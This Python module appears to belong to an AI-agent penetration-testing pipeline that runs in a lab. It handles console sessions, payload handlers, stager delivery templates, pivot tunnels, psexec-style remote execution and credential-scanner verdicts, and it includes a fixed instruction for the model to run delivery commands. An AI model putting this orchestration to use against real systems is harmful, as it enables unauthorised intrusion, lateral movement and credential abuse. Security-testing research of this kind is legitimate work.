"""Deployment-side channel owner: accepted sessions live in the console.

The repository owns the fixed sequence and the identity checks. Action cards declare
delivery shapes; this module binds run values and builds the fixed transport command.
Construction performs no remote IO.

Contract (see docs/pipeline.md): open_owner returns a context manager answering
validate_execution_binding / action_executor / post_gateway / deliver, and
reserve_receiver returns a context manager answering start / wait_ready / wait_callback.
"""

from contextlib import contextmanager
from copy import deepcopy
import base64
import json
import re
import shlex
from json import dumps, loads
from pathlib import Path
from socket import create_connection
from time import monotonic, sleep

from pydantic import BaseModel, ConfigDict, Field
import yaml

from src.agents.executor.schema import ActionSkillCard
from src.agents.executor.tool_contracts import interpreter_command
from src.agents.executor.retrieval import DEFAULT_ROOT as ACTION_SKILL_ROOT
from src.agents.pre_verifier.schema import ExecutionRequest
from src.agents.post_verifier.context import freeze_execution, freeze_carrier_export
from src.session.execution_session import ExecutionBinding, Nonempty, SessionReference
# Compatibility export for callers constructing the owner's registration receipt.
from src.session.execution_session import SessionRegistration
from src.session.pipeline_service import PipelineFailure
from src.session.session_backend import SessionBackend, SessionRequest
from src.session.session_migration import CallbackPayload, CallbackReceipt
from src.session.carrier import CarrierExport
from deployment.post_observation import (identity_probe, tcp_probe, tcp_probe_shape,
                                         command_receipt)


def _await_ready(probe, *, timeout, interval=0.25):
    """Return the first truthy probe result, or the last value at the deadline.

    A readiness probe is not a blind wait: each round asks the real surface (peer
    service jobs, a forwarded port, a listener) and returns as soon as it answers.
    """
    deadline = monotonic() + max(0.0, float(timeout))
    while True:
        value = probe()
        remaining = deadline - monotonic()
        if value or remaining <= 0:
            return value
        sleep(min(float(interval), remaining))


MODULE_LOAD_FAILURES = ("Failed to load module", "Unknown command")


def _module_text_ready(text):
    value = str(text or "").strip()
    return bool(value) and not any(marker in value for marker in MODULE_LOAD_FAILURES)


def _await_module(probe, *, timeout, interval=0.5):
    """Retry a console module load until it is ready, not after a fixed sleep.

    A busy console can answer the first ``use`` with "Failed to load module" while the
    previous module is still draining. Polling the same idempotent line is both faster
    and more honest than waiting ten seconds and hoping the console became idle.
    """
    # The console call itself already carries the module budget. This window only decides
    # how long to retry a "module still loading" answer, so it stays short: a broken module
    # must not turn into a second full budget.
    deadline = monotonic() + min(max(float(timeout), 1.0), 3.0)
    while True:
        text = probe()
        if _module_text_ready(text):
            return text
        remaining = deadline - monotonic()
        if remaining <= 0:
            return text
        sleep(min(float(interval), remaining))


#: Fixed delivery specification: each command template declares exactly which
#: placeholders it accepts, and every value it needs must be a real binding -- never a
#: placeholder marker, and never a name only the model could fill in.
TEMPLATE_PLACEHOLDERS = {
    "receiver_command": ("port",),
    "artifact_command": ("port",),
    #: A stop step may address the service by pid file instead of by port.
    "receiver_stop_command": (),
    "launch_command": ("artifact_url", "remote_path"),
}
#: Fields that may use extra placeholders without being required to.
OPTIONAL_TEMPLATE_PLACEHOLDERS = {
    "receiver_command": ("fetch_port", "payload", "format", "stager_path", "callback_host"),
    "artifact_command": ("fetch_port", "payload", "format", "stager_path", "callback_host"),
    "receiver_stop_command": ("port", "fetch_port"),
    "launch_command": ("fetch_port",),
}
#: Templates a deployment may omit entirely (the runtime then has no artifact build step).
OPTIONAL_TEMPLATE_FIELDS = {"artifact_command"}
#: Placeholders a field may use without being required to: a deployment may serve the
#: artifact from a fixed address instead of the reserved one.
OPTIONAL_PLACEHOLDERS = {"artifact_url": ("port", "callback_host")}
REQUIRED_BINDINGS = ("artifact_url", "remote_path", "operation_root", "payload_ref")
PLACEHOLDER_MARKER = "REQUIRED_"
#: Values the runtime binds into the card's authorization template.
DELIVERY_AUTHORIZE_PLACEHOLDERS = ("target_host", "target_port", "username", "handler_port",
                                   "callback_host", "operation_id", "artifact_url",
                                   "remote_path", "public_key", "public_key_file", "key_path",
                                    "target_name", "stager_path")
#: Values the runtime binds into a card-declared channel entry.
ENTRY_SETUP_PLACEHOLDERS = ("public_key", "public_key_file", "key_path", "target_host",
                            "target_address", "target_port", "username", "marker")
#: Fixed instruction handed to the Action whenever a hand-over is required: the model
#: runs the two prepared commands and reports honestly; claiming a session is the
#: runtime's job, never the model's claim.
DELIVERY_INSTRUCTION = ("先照抄执行 delivery_authorize_command，再照抄执行 delivery_command，如实报告两条的真实回执；"
                        "不要自己拼引号、地址或端口，也不要自己登记会话。运行层会在你报告之后认领并登记会话；"
                        "只做到回读、没看到会话不算完成（运行层会如实记未确认）。同一命令只跑一次，不要重复执行。")


def credential_verdict(text):
    """Turn a login scanner's text into an explicit bool/None.

    The model should not have to infer success from tool-specific spelling. The last
    decisive line wins, so a banner or a module warning earlier in the output cannot
    override the actual login result.
    """
    success = ("pwn3d!", "status_success", "login successful", "authenticated")
    failure = ("status_logon_failure", "status_access_denied", "login failed",
               "failed to authenticate", "invalid credentials", "cannot access")
    verdict = None
    for line in str(text or "").casefold().splitlines():
        if ("[+]" in line or any(marker in line for marker in success)
                or re.search(r"\bsuccess\b", line)):
            verdict = True
        elif "[-]" in line or any(marker in line for marker in failure):
            verdict = False
    return verdict


def placeholders(template):
    return tuple(re.findall(r"\{([A-Za-z_][A-Za-z0-9_]*)\}", str(template)))


def fill_template(template, values):
    """Bind the runtime's own values; an unbound placeholder is refused by name."""
    text = str(template or "")
    if any(key not in values or values[key] is None or not str(values[key]).strip()
           or PLACEHOLDER_MARKER in str(values[key]) for key in placeholders(text)):
        raise PipelineFailure("参数没给到", "owner_delivery_template_unbound")
    bound = re.sub(r"\{([A-Za-z_][A-Za-z0-9_]*)\}",
                   lambda match: str(values[match[1]]), text)
    if placeholders(bound):
        raise PipelineFailure("参数没给到", "owner_delivery_template_unbound")
    return bound


def load_delivery_card(name):
    """Load a configured Action card locally, never an arbitrary filesystem path."""
    if not isinstance(name, str) or not re.fullmatch(r"[a-z0-9]+(?:-[a-z0-9]+)*", name):
        raise PipelineFailure("参数没给到", "owner_delivery_card_invalid")
    root = Path(ACTION_SKILL_ROOT).resolve()
    path = (root / name / "SKILL.md").resolve()
    if not path.is_relative_to(root):
        raise PipelineFailure("参数没给到", "owner_delivery_card_invalid")
    try:
        card = ActionSkillCard.from_markdown(path.read_text(encoding="utf-8"))
    except FileNotFoundError as exc:
        raise PipelineFailure("参数没给到", "owner_delivery_card_not_found") from exc
    except (ValueError, OSError, yaml.YAMLError) as exc:
        raise PipelineFailure("参数没给到", "owner_delivery_card_invalid") from exc
    if card.name != name:
        raise PipelineFailure("参数没给到", "owner_delivery_card_invalid")
    if card.delivery is None:
        raise PipelineFailure("参数没给到", "owner_delivery_card_missing_delivery")
    template = card.delivery.entry.authorize_command
    if set(placeholders(template)) - set(DELIVERY_AUTHORIZE_PLACEHOLDERS):
        raise PipelineFailure("参数没给到", "owner_delivery_spec_invalid_authorize_command")
    if PLACEHOLDER_MARKER in template:
        raise PipelineFailure("参数没给到", "owner_delivery_binding_required_delivery")
    try:
        shlex.split(template)
    except ValueError as exc:
        raise PipelineFailure("参数没给到", "owner_delivery_authorize_syntax_invalid") from exc
    return card.delivery


def validate_delivery_spec(options):
    """Fail at startup with a named field instead of at the first migration attempt."""
    values = dict(options) if isinstance(options, dict) else options.model_dump()
    for field, required in TEMPLATE_PLACEHOLDERS.items():
        template = str(values.get(field) or "")
        if not template and field in OPTIONAL_TEMPLATE_FIELDS:
            continue
        found = placeholders(template)
        allowed = (set(required) | set(OPTIONAL_PLACEHOLDERS.get(field, ()))
                   | set(OPTIONAL_TEMPLATE_PLACEHOLDERS.get(field, ())))
        unknown = sorted(set(found) - allowed)
        if unknown:
            raise PipelineFailure("参数没给到", "owner_delivery_spec_unknown_" + field)
        if not set(required) <= set(found):
            raise PipelineFailure("参数没给到", "owner_delivery_spec_missing_" + field)
    for field in (*REQUIRED_BINDINGS, *TEMPLATE_PLACEHOLDERS):
        if PLACEHOLDER_MARKER in str(values.get(field) or ""):
            raise PipelineFailure("参数没给到", "owner_delivery_binding_required_" + field)

    handler = values.get("handler")
    if handler is not None:
        if not isinstance(handler, dict):
            raise PipelineFailure("参数没给到", "owner_handler_invalid")
        payloads = handler.get("payloads")
        if payloads is not None and not isinstance(payloads, dict):
            raise PipelineFailure("参数没给到", "owner_handler_payloads_invalid")
        declared = [str(handler.get("payload") or "")] + list((payloads or {}).values())
        if not any(value.strip() for value in declared):
            raise PipelineFailure("参数没给到", "owner_handler_payload_required")
        if any(PLACEHOLDER_MARKER in str(value) for value in declared):
            raise PipelineFailure("参数没给到", "owner_handler_payload_required")
    if handler is None and not str(values.get("receiver_command") or "").strip():
        raise PipelineFailure("参数没给到", "owner_receiver_not_declared")

    fetch_port = values.get("fetch_port")
    if fetch_port is not None and (type(fetch_port) is not int or not 1 <= fetch_port <= 65535):
        raise PipelineFailure("参数没给到", "owner_fetch_port_invalid")
    delivery = values.get("delivery")
    if delivery is not None:
        if not isinstance(delivery, dict):
            raise PipelineFailure("参数没给到", "owner_delivery_spec_invalid")
        if set(delivery) - {"key_path", "stager_path", "domain_user",
                            "domain_password", "credential_ref"}:
            raise PipelineFailure("参数没给到", "owner_delivery_spec_invalid")
        for field in ("key_path", "stager_path"):
            value = delivery.get(field, "")
            if not isinstance(value, str):
                raise PipelineFailure("参数没给到", "owner_delivery_spec_invalid")
            if PLACEHOLDER_MARKER in value:
                raise PipelineFailure("参数没给到", "owner_delivery_binding_required_delivery")
        # Both are deployment-owned values: a card's ssh entry setup reads the run key,
        # and a runtime-owned hand-over builds the stager. A missing one is a deployment
        # error, never something the model may invent.
        if not delivery.get("key_path", "").strip():
            raise PipelineFailure("参数没给到", "owner_delivery_key_missing")
        if not delivery.get("stager_path", "").strip():
            raise PipelineFailure("参数没给到", "owner_stager_path_required")
    validate_registered_cards()
    return True


def validate_registered_cards():
    """Validate every card's hand-over declaration before a run starts.

    This is a registry check, not a service table: whatever the retrieval can select is
    exactly what gets validated. Adding a method therefore needs no deployment edit.
    """
    root = Path(ACTION_SKILL_ROOT).resolve()
    for path in sorted(root.glob("*/SKILL.md")):
        if not path.resolve().is_relative_to(root):
            raise PipelineFailure("参数没给到", "owner_delivery_card_invalid")
        card = ActionSkillCard.from_markdown(path.read_text(encoding="utf-8"))
        if card.delivery is not None:
            template = card.delivery.entry.authorize_command
            unknown = set(placeholders(template)) - set(DELIVERY_AUTHORIZE_PLACEHOLDERS)
            if unknown or PLACEHOLDER_MARKER in template:
                raise PipelineFailure(
                    "参数没给到", "owner_delivery_spec_invalid_authorize_command")
            try:
                shlex.split(template)
            except ValueError as exc:
                raise PipelineFailure(
                    "参数没给到", "owner_delivery_authorize_syntax_invalid") from exc
        if card.entry_setup is not None and card.entry_setup.provider == "ssh":
            template = card.entry_setup.authorize_command
            unknown = set(placeholders(template)) - set(ENTRY_SETUP_PLACEHOLDERS)
            if unknown or PLACEHOLDER_MARKER in template:
                raise PipelineFailure(
                    "参数没给到", "owner_entry_setup_spec_invalid_authorize_command")
    return True


class OwnerOptions(BaseModel):
    """Everything the deployment supplies; nothing here names a target."""

    model_config = ConfigDict(extra="forbid", frozen=True, str_strip_whitespace=True)
    backend: dict
    receiver_binding: dict
    #: The console owns the payload handler: it is armed with the reserved callback port
    #: and the deployment declares which payload it hands over.
    #: The console owns the payload handler. Declare either one payload for every target
    #: (handler.payload) or one per logical host (handler.payloads[host]).
    handler: dict | None = None
    #: Optional fetch service for a target that pulls the artifact over http. Sequential
    #: runs may share one fixed port; the reserved callback port stays per migration.
    receiver_command: str = ""
    receiver_stop_command: str = ""
    #: Optional idempotent artifact build for a card-owned hand-over. It is distinct
    #: from receiver_command: a card may own its listener/server, but the stager still
    #: has to exist before its delivery command runs.
    artifact_command: str = ""
    fetch_port: int | None = None
    launch_command: Nonempty
    artifact_url: Nonempty
    remote_path: Nonempty
    operation_root: Nonempty
    #: Service-to-card mapping and control-side material paths; no command templates.
    delivery: dict | None = None
    #: One transport for every consumer: a SOCKS endpoint on the control side whose egress
    #: is the pivot, plus forwarded callback ports. Command-line tools use the SOCKS
    #: endpoint, framework modules use a forwarded port; neither uses the framework route.
    tunnel: dict | None = None
    #: Declared controller entries: session_id -> {host, privilege, via?}. A declaration is not
    #: proof by itself; check_session still observes the real execution context through it.
    entries: dict = Field(default_factory=dict)
    end_marker: Nonempty = "agv-call-end"
    shell_nonce_prefix: Nonempty = "AGV_POST_NONCE="
    command_timeout: float = Field(default=60, gt=0, allow_inf_nan=False)
    ready_timeout: float = Field(default=15, gt=0, allow_inf_nan=False)
    callback_timeout: float = Field(default=120, gt=0, allow_inf_nan=False)
    poll_interval: float = Field(default=0.5, gt=0, allow_inf_nan=False)


def _receipt_stdout(value) -> str:
    """Find the captured stdout in whichever transport shape came back.

    The Kali entry hands back the MCP envelope (`tool_name` / `response.content[]`), while
    the action adapter unwraps it to `{stdout, return_code}`. A caller that reads only one
    shape sees empty command output and reports an unconfirmed effect (live 2026-10-18,
    node 2's read-back through Impacket).
    """
    import json as _json

    if isinstance(value, dict):
        if isinstance(value.get("stdout"), str):
            return value["stdout"]
        for item in value.values():
            found = _receipt_stdout(item)
            if found:
                return found
    elif isinstance(value, list):
        for item in value:
            found = _receipt_stdout(item)
            if found:
                return found
    elif isinstance(value, str) and '"stdout"' in value:
        try:
            return str(_json.loads(value).get("stdout") or "")
        except (ValueError, TypeError):
            return ""
    return ""


def _write_json(path: Path, value) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(dumps(value, ensure_ascii=False, indent=2, default=str) + "\n", encoding="utf-8")


class ConsolePostGateway:
    """Read-only observation through the pinned channel, bound to one operation and nonce."""

    def __init__(self, owner, binding, root: Path, *, context, carrier=None):
        self.owner, self.binding, self.root = owner, binding, root
        self.carrier = deepcopy(carrier)
        self.context = deepcopy(context)

    def _path(self, operation_id):
        return Path(self.root) / "post" / (str(operation_id) + ".json")

    def _target_matches(self, session_host):
        """A console reports the address; the graph keeps the logical name."""
        carrier = (self.carrier or {}).get("carrier") or {}
        carrier_host = str(carrier.get("target_host") or "")
        if str(session_host) == carrier_host:
            return True
        # A container calls back from its own address, which the graph never carried; the
        # claim recorded that address as an observation, so it is a fact, not a guess.
        if str(session_host) == str(carrier.get("address") or ""):
            return True
        target = self.context.get("target_host")
        addresses = ((self.context.get("hosts") or {}).get(target) or {}).get("ips") or []
        return str(session_host) in {str(value) for value in addresses}

    def observe(self, request, context, *, operation_id, nonce):
        saved = self.lookup_observation(operation_id)
        if saved is not None:
            return saved
        credential_control = (
            lambda name, arguments: self.owner.test_credential(**arguments)
            if name == "credential_test" and hasattr(self.owner, "test_credential") else None)
        # Pre/Post now emit the same {tool, target, arguments} contract; the gate below
        # speaks the legacy view. One normalization point, before any decision.
        from src.tools.adapt import to_legacy_request
        request = to_legacy_request(request)
        # The factory's frozen input is authoritative; callers cannot redirect a
        # probe by changing the context passed to observe.
        frozen = self.context
        target_state = frozen["proposition"] == "target_state"
        command = "echo " + self.owner.options.shell_nonce_prefix + str(nonce)
        request_not_executed = False
        try:
            if any(context.get(key) != frozen.get(key) for key in (
                    "proposition", "target_host", "hosts", "outputs", "execution",
                    "current_carrier_ref", "carrier_inventory")):
                raise ValueError("Observation context changed")
            if self.carrier is not None:
                # The claimed channel runs the finished probe; the request's own
                # entry field is not an execution handle here.
                via = str((request or {}).get("via") or "")
                # The probe's shape follows the claimed channel's own platform: a Windows
                # channel answers to its own identity statements, not to POSIX ones.
                platform = None
                try:
                    carrier_ref = SessionReference.model_validate(
                        self.carrier["channel"]["reference"])
                    platform = self.owner.backend.get_session(
                        carrier_ref.session_id, instance_id=carrier_ref.instance_id).platform
                except Exception:
                    platform = None
                try:
                    command = tcp_probe(request, frozen, None, nonce, via=via)
                except (ValueError, TypeError, KeyError):
                    command = identity_probe(request, nonce, via=via, platform=platform)
            else:
                # The policy follows the node's own fact type, never the card: a reachability
                # fact is a port probe whose endpoint must be one of the frozen ones; every other
                # fact is the model's own request delivered by the same dispatch as every other
                # stage (four fields decide where and what runs).
                reachability = any(str(fact.get("predicate")) == "netAccess"
                                   for fact in frozen.get("outputs", []))
                if reachability:
                    # The fact is a reachable endpoint, so the observation must be a port probe
                    # against a frozen endpoint: anything else is refused, not delivered.
                    command = tcp_probe(request, frozen, self.binding, nonce)
                else:
                    try:
                        # A request that is itself a port probe still needs its endpoint
                        # authorized, even when the fact is something else.
                        command = tcp_probe(request, frozen, self.binding, nonce)
                    except (ValueError, TypeError, KeyError):
                        if tcp_probe_shape((request or {}).get("content"), nonce) is not None:
                            # It is a port probe at an endpoint that was never declared: refused,
                            # not delivered.
                            raise
                        command = str((request or {}).get("content") or "")
        except (ValueError, TypeError, KeyError):
            if target_state:
                code = "post_target_state_observation_rejected"
                observation = {"effect_known": False, "response": {
                    "category": "参数没给到", "error_code": code, "detail": code,
                    "operation_id": str(operation_id), "target_host": frozen["target_host"],
                    "nonce_observed": None, "carrier_ref": frozen.get("current_carrier_ref")}}
                _write_json(self._path(operation_id), {"request": deepcopy(request), "observation": observation})
                return observation
            # A liveness observation may fall back to the nonce echo, but it must say
            # so: the model asked for a command that was not executed.
            request_not_executed = True
        context = frozen
        marker = ("AGV_POST_NONCE=" if target_state else self.owner.options.shell_nonce_prefix) + str(nonce)
        unavailable = ("post_carrier_channel_unavailable" if self.carrier is not None
                       else "post_observation_channel_unavailable")
        error = {}
        receipt, raw_response = {}, None
        try:
            # Every branch hands the dispatcher the same four fields; only which channel the
            # binding names differs (a claimed carrier, the node's own session, or the face).
            carried_tool = (request or {}).get("tool") or "cmd"
            carried = {"tool": carried_tool,
                       "name": (request or {}).get("name") or "bash",
                       "via": (request or {}).get("via")
                              or (self.binding.via if self.binding is not None else "session"),
                       # A control tool's content is its own object, not a target probe
                       # command. Target-side requests keep the probe command line.
                       "content": ((request or {}).get("content")
                                   if carried_tool in {"control", "msf"} else command)}
            if self.carrier is not None:
                channel = self.carrier.get("channel") or {}
                reference = SessionReference.model_validate(channel["reference"])
                provider_name = str(channel.get("provider") or "console")
                stored = None
                if provider_name == "console":
                    metadata = self.owner.backend.get_session(reference.session_id,
                        instance_id=reference.instance_id)
                    host_value, platform = str(metadata.host), str(metadata.platform)
                else:
                    # A provider-owned carrier has no console metadata; its frozen binding
                    # is the authority for address, platform and connection parameters.
                    from src.session.execution_session import ExecutionBinding
                    stored = ExecutionBinding.model_validate(channel.get("binding") or {})
                    metadata = None
                    host_value = (stored.addresses[0] if stored.addresses else stored.host)
                    platform = stored.platform
                if not self._target_matches(host_value):
                    raise ValueError("Carrier target changed")
                # The claimed carrier goes through the same dispatcher as everything else; the
                # caller already resolved this channel, which is what ``session="force"`` means.
                from deployment.request_dispatch import deliver

                # A liveness observation has no node binding of its own: the carrier's own
                # session metadata is the authority for host, platform and privilege.
                carrier_binding = {
                    "session": reference.model_dump(),
                    # The carrier is a registered session; the model's own entry field
                    # must not redirect its observation back to the kali face.
                    "via": "session",
                    "host": (stored.host if stored is not None else str(metadata.host)),
                    "addresses": (list(stored.addresses) if stored is not None else []),
                    "identity": str(self.carrier.get("privilege") or "unknown"),
                    "platform": platform,
                    "binding_kind": "console_session", "tunnel_endpoints": []}
                if stored is not None:
                    carrier_binding.update({"provider": provider_name,
                        "ssh_key_path": stored.ssh_key_path, "ssh_port": stored.ssh_port,
                        "webshell_url": stored.webshell_url,
                        "webshell_parameter": stored.webshell_parameter})
                # The carrier redirects target-side commands to its own session. A
                # control-plane tool (credential_test / msf_job / serve_file /
                # remote_process) keeps via=kali; the control contract rejects a session
                # face for it.
                if str(carried.get("tool") or "") not in {"msf", "control"}:
                    carried = {**carried, "via": "session"}
                result = deliver(carrier_binding, carried, backend=self.owner.backend,
                                 transports=self.owner.transports, session="force",
                                 control=credential_control)
                known = bool(result["effect_known"])
                # The whole dispatcher receipt travels on, not just its text: the surface fields
                # and any transport fields belong to the observation too (a carrier observation
                # used to drop them, so the same receipt meant different things per path).
                merged = dict(result.get("response") or {})
                receipt = {**merged, **(command_receipt(merged) or {})}
                stdout = str(merged.get("output") or receipt.get("stdout") or "")
            else:
                if (self.binding is None
                        or self.owner.validate_execution_binding(self.binding) is not True):
                    raise ValueError("Observation entry unavailable")
                from deployment.request_dispatch import deliver

                target_host = str(frozen.get("target_host") or "")
                if (self.binding.binding_kind != "controller_entry"
                        and str(self.binding.host) != target_host):
                    # The bound session is a different machine (a pivot), so a command run
                    # locally would describe that machine and never this node's target. The
                    # probe is therefore executed on the target through the control plane:
                    # that is the only place it produces target evidence, and the identity
                    # statements in the same command still prove which host answered.
                    addresses = ((frozen.get("hosts") or {}).get(target_host) or {}).get("ips") or []
                    if not addresses:
                        raise ValueError("post_target_address_missing")
                    # The target lives behind the node's own pivot session, so the probe goes
                    # through that session's route: open the service channel on the target,
                    # run the probe inside it, close it. A controller-side SMB client cannot
                    # reach this segment on the clean lab.
                    remote_command = command.replace(" & ", "\n")
                    remote = self.owner.control_remote_process(
                        self.binding, str(addresses[0]), remote_command, "", "msf_psexec")
                    result = None
                    known = bool(remote.get("effect_known"))
                    stdout = str((remote.get("response") or {}).get("stdout") or "")
                    receipt = {"stdout": stdout}
                elif self.binding.binding_kind == "controller_entry":
                    # One entry for every stage: the four fields decide the channel and the
                    # command line; only the receipt interpretation stays stage-specific.
                    result = deliver(self.binding, carried,
                                     backend=getattr(self.owner, "backend", None),
                                     transports=self.owner.transports, session="auto",
                                     control=credential_control)
                    raw_response = deepcopy(result.get("response"))
                    receipt = command_receipt(raw_response) or {}
                    known, stdout = bool(receipt), receipt.get("stdout", "")
                else:
                    result = deliver(self.binding, carried,
                                     backend=getattr(self.owner, "backend", None),
                                     transports=self.owner.transports, session="auto",
                                     control=credential_control)
                    raw_response = deepcopy(result.get("response"))
                    known = bool(result["effect_known"])
                    # The dispatcher reports the capture as `stdout`; older callers read
                    # `output`. Accept both, or every observation looks empty and the node
                    # is judged unknown while its raw receipt holds the answer (live
                    # 2026-10-18, node 5 post).
                    stdout = str(raw_response.get("output") or raw_response.get("stdout") or "")
            if not known:
                error = {"category": "会话没接上", "error_code": unavailable, "detail": unavailable,
                         "inner_detail": str((result or {}).get("detail") or "unconfirmed")}
        except Exception as exc:
            from langgraph.errors import GraphInterrupt
            if isinstance(exc, GraphInterrupt):
                raise
            known, stdout = False, ""
            # Keep the runtime's own named reason: without it a failed observation is only
            # "channel unavailable" and nothing can be diagnosed.
            error = {"category": "会话没接上", "error_code": unavailable, "detail": unavailable,
                     "inner_detail": getattr(exc, "detail", None)
                     or f"{type(exc).__name__}: {str(exc)[:200]}"}
        # A control-plane observation (credential test / peer service) has its own
        # evidence and no target-side nonce line; do not discard it for lacking one.
        control_request = str((request or {}).get("tool") or "") in {"control", "msf"}
        fresh = control_request or marker in [line.strip() for line in stdout.splitlines()]
        response = {**receipt, "stdout": stdout, "operation_id": str(operation_id),
                    "target_host": str(context["target_host"]),
                    "nonce_observed": str(nonce) if fresh else None,
                    "carrier_ref": context.get("current_carrier_ref"),
                    "request_not_executed": request_not_executed, **error}
        if raw_response is not None:
            response["raw_response"] = raw_response
        observation = {"effect_known": bool(known and fresh), "response": response}
        _write_json(self._path(operation_id), {"request": deepcopy(request), "observation": observation})
        return observation

    def lookup_observation(self, operation_id):
        path = self._path(operation_id)
        if not path.exists():
            return None
        return loads(path.read_text(encoding="utf-8")).get("observation")


class ExecutionSessionOwner:
    """The deployment's channel owner. Sessions are observed in the console, never created here."""

    def __init__(self, *, transports, options):
        self.transports = transports
        self.options = OwnerOptions.model_validate(options)
        validate_delivery_spec(self.options)
        self.backend = SessionBackend(self.options.backend)
        self.credentials = None
        self.default_credential_ref = ""
        self.root = Path(self.options.operation_root)
        self._handlers: dict[str, str] = {}
        self._action_payloads: dict[str, CallbackPayload] = {}
        #: Which call-back port each built artifact embeds, so a migration can tell a stale
        #: stager from one matching its own receiver.
        self._artifact_ports: dict[str, int] = {}
        #: Subnets already routed through a live session for this process.
        self._routes: set[str] = set()
        #: Sessions a control-plane remote execution produced, keyed by operation id.
        #: The Action -> Post hand-over reads this instead of guessing from output text.
        self._produced_sessions: dict[str, dict] = {}
        #: One live tunnel per pivot host, plus the callback ports this process has handed
        #: out. Ports are never reused, so a previous session's forward stays untouched.
        self._tunnels: dict[str, dict] = {}
        self._tunnel_ports: set[int] = set()

    def __enter__(self):
        self.backend.connect()
        return self

    def __exit__(self, *args):
        self.backend.close()

    # --- identity ---------------------------------------------------------
    def _pinned(self, reference):
        return SessionReference.model_validate(reference)

    def is_console_session(self, session_id: str) -> bool:
        return str(session_id) in self.backend.list_sessions()

    def validate_execution_binding(self, binding, *, host_aliases=()):
        """Confirm the frozen binding still names the instance the owner holds."""
        binding = ExecutionBinding.model_validate(binding)
        if binding.binding_kind == "controller_entry":
            return self._check_controller_entry(binding)
        if str(binding.provider or "msf") != "msf":
            # A provider-owned channel has no console metadata. Its frozen binding is the
            # identity; liveness is observed by the stage that actually speaks to it.
            if not binding.identity or not (binding.addresses or binding.host):
                raise PipelineFailure("会话没接上", "owner_session_binding_mismatch")
            return True
        metadata = self.backend.get_session(binding.session.session_id,
                                           instance_id=binding.session.instance_id)
        # A console reports the address; the graph keeps the logical name. The
        # binding carries the frozen addresses of that machine, and a caller may
        # pass additional ones explicitly.
        accepted = {str(binding.host), *(str(value) for value in binding.addresses),
                    *(str(value) for value in host_aliases)}
        if str(metadata.host) not in accepted or metadata.platform != binding.platform:
            raise PipelineFailure("会话没接上", "owner_session_binding_mismatch")
        return True

    #: Legacy spelling kept for stored evidence, external callers and older tests.
    check_session = validate_execution_binding

    def verify_destination(self, request, reference):
        """Observe M through the pinned management provider before registering it."""
        from secrets import token_hex
        from src.session.session_backend import SessionRequest
        metadata = self.backend.get_session(reference.session_id, instance_id=reference.instance_id)
        if metadata.type not in {"shell", "meterpreter"}:
            raise ValueError("Unknown management session type")
        def observe():
            nonce = token_hex(16)
            begin = "AGV_V_BEGIN:" + nonce
            # The transport consumes the terminal marker line (and the Windows path uses its
            # own frame end), so completeness comes from operation_confirmed, not from the
            # marker still being present in the captured output.
            end = "AGV_V_DONE:" + nonce
            if metadata.platform == "windows":
                commands = ("echo " + begin + " & echo AGV_V_ID & whoami & echo AGV_V_HOST "
                            "& hostname & echo " + end)
            else:
                commands = ("echo " + begin + "; echo AGV_V_ID; id -un; "
                            "echo AGV_V_HOST; hostname; echo " + end)
            response = self.backend.execute(reference, SessionRequest(command=commands,
                end_markers=(end,), timeout=self.options.command_timeout))
            lines = [line.strip() for line in response.output.splitlines() if line.strip()]
            # A paired, labeled frame: a command echo may repeat it, so the last BEGIN and
            # the first END after it delimit the real response. Bare marker counting was
            # fragile (bridge review sm418).
            if not response.operation_confirmed or begin not in lines:
                raise ValueError("Destination not observable")
            start = len(lines) - 1 - lines[::-1].index(begin)
            frame = [line for line in lines[start + 1:] if not line.startswith(end)]
            try:
                identity = frame[frame.index("AGV_V_ID") + 1]
                hostname = frame[frame.index("AGV_V_HOST") + 1]
            except (ValueError, IndexError):
                raise ValueError("Destination identity incomplete")
            # A Windows channel can report a domain-qualified account. Keep the effective
            # identity; only conventional built-in SYSTEM has an equivalent graph spelling.
            if identity.lower() == "nt authority\\system" and request.privilege.lower() == "system":
                identity = request.privilege
            accepted = {request.host, request.observed_address}
            # Graph names are logical (e.g. a service may report its OS hostname).
            # The pinned provider's observed address binds that hostname to the target.
            known_names = {str(request.host).lower(),
                           *[str(alias).lower() for alias in (request.identity_aliases or [])]}
            if hostname.lower() in known_names:
                host = request.host
            else:
                host = request.host if metadata.host in accepted else metadata.host
            return {"reference": reference.model_dump(), "provider": "console", "host": host,
                    "privilege": identity, "alive": True, "managed": True}

        try:
            return observe()
        except ValueError:
            # One transient miss on a busy channel is not a failed destination: retry the
            # whole frame with a fresh marker before reporting the node incomplete.
            return observe()

    @staticmethod
    def _stdout_text(response, depth=0):
        """Read actual output from whichever shape the transport returned.

        VMware guest calls answer with stdout directly. The Kali client answers with
        {"tool_name", "is_error", "response": <MCP payload>}, and that payload carries the
        real command result either as structuredContent or as one content[].text JSON
        string -- the same unwrapping the Kali client itself applies.
        """
        if not isinstance(response, dict) or depth > 4:
            return ""
        text = "".join(response[key] for key in ("stdout", "output")
                       if isinstance(response.get(key), str))
        if text:
            return text
        nested = [response.get(key) for key in ("structuredContent", "response", "result")]
        content = response.get("content")
        if isinstance(content, list) and len(content) == 1 and isinstance(content[0], dict):
            try:
                nested.append(json.loads(content[0].get("text", "")))
            except (ValueError, TypeError):
                pass
        for value in nested:
            if isinstance(value, dict):
                text = ExecutionSessionOwner._stdout_text(value, depth + 1)
                if text:
                    return text
        return ""

    def _source_call(self, binding, content):
        """Run one read-only command through the binding's own entry, never a fallback."""
        result = self.transports.execute(
            binding.model_dump(exclude_none=True),
            ExecutionRequest(tool="code", name="bash", via=binding.via, content=content))
        return (bool(result.get("effect_known")),
                ExecutionSessionOwner._stdout_text(result.get("response")))

    def _check_controller_entry(self, binding):
        """A declared entry still has to prove its own execution context."""
        declaration = self.options.entries.get(binding.session.session_id)
        if not isinstance(declaration, dict):
            raise PipelineFailure("会话没接上", "owner_entry_not_declared")
        if binding.platform != "linux":
            raise PipelineFailure("参数没给到", "owner_controller_entry_requires_linux")
        if ((str(declaration.get("host") or ""), str(declaration.get("privilege") or ""))
                != (binding.host, binding.identity)
                or ("via" in declaration and declaration["via"] != binding.via)):
            raise PipelineFailure("会话没接上", "owner_entry_declaration_mismatch")
        known, text = self._source_call(binding, "id -un; hostname")
        if not known:
            raise PipelineFailure("会话没接上", "owner_entry_context_unobserved")
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if len(lines) < 2 or (lines[0], lines[1]) != (binding.identity, binding.host):
            raise PipelineFailure("会话没接上", "owner_entry_context_mismatch")
        return True

    # --- execution --------------------------------------------------------
    # Writing a command into a session lives in exactly one place now:
